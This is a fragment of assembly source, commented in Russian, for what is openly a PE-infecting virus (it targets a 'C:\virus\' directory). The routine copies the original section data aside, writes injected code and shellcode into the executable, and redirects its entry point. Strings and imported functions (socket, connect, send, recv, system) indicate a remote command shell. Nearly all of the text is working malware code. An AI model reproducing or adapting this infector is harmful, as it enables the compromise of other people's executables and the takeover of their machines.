	; csi = pe->sections
	mov csi, [cdi].sections
    assume csi: ptr IMAGE_SECTION_HEADER
	
    ;копируем данные из первой секции в расширенную, последнюю
	xor ccx, ccx
	mov ecx, [csi].PointerToRawData
	add ccx, [cdi].mem
	; pe->mem + offsetNewData
	mov cax, [offsetNewData]
	add cax, [cdi].mem
	invoke sc_memcpy, cax, ccx, main - sc_start	
	
    ; копируем внедряемый код на место новой точки входа
	xor ccx, ccx
	mov ecx, [csi].PointerToRawData
	add ccx, [cdi].mem
	invoke sc_memcpy, ccx, addr [cbx + sc_start], main - sc_start
	
    ; копируем шеллкод, который будет вызван из внедренного кода
    ; memcpy (pe->mem + offsetNewData + 2 * sizeof(DWORD) + ((DWORD)InjectCode - (DWORD)InjectedCode), code, codeSize);
	mov ccx, [offsetNewData]
	add ccx, [cdi].mem
	add ccx, main - sc_start
	invoke sc_memcpy, ccx, addr [cbx + main], sc_end - main
	
    ; устанавливаем точку входа на внедренный код
    ; pe->nthead->OptionalHeader.AddressOfEntryPoint = pe_start + pe->sections->VirtualAddress;
	mov edx, [csi].VirtualAddress
	add edx, pe_start
	mov csi, [cdi].nthead
    assume csi: ptr IMAGE_NT_HEADERS
	mov [csi].OptionalHeader.AddressOfEntryPoint, edx
	or [csi].FileHeader.Characteristics, 1
	
	;invoke sc_printf, addr [cbx + hexFormat], 1111h
	
	ret	
InjectPeFile endp

injCount:
	dd ?
strHello:
	db "Hello, i am shell! Please enter command to execute or 0 to exit!", 13, 10, 0
strCheckPeFile:
	db "Check for injecting...", 13, 10, 0
strPeFileWillBeInjected:
	db "PE file is injected!", 13, 10, 0
strCopy:
	db "copy ", 0
strFormat:
	db "%s", 13, 10, 0
strDecFormat:
	db "DEC: %d", 13, 10, 0
strHexFormat:
	db "HEX: %08X", 13, 10, 0
injDirName:
	db "C:\virus\", 0, 0, 0, 0, 0, 0, 0, 0

DefineFuncNamesAndPointers printf, system, strlen, memcpy, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, ReadFile, GetFileSize, CreateFileMappingA, CloseHandle, MapViewOfFile, UnmapViewOfFile, SuspendThread, GetCurrentThread, WSAStartup, WSAGetLastError, socket, WSACleanup, send, recv, connect, htons

sc_end:
sc ends

end
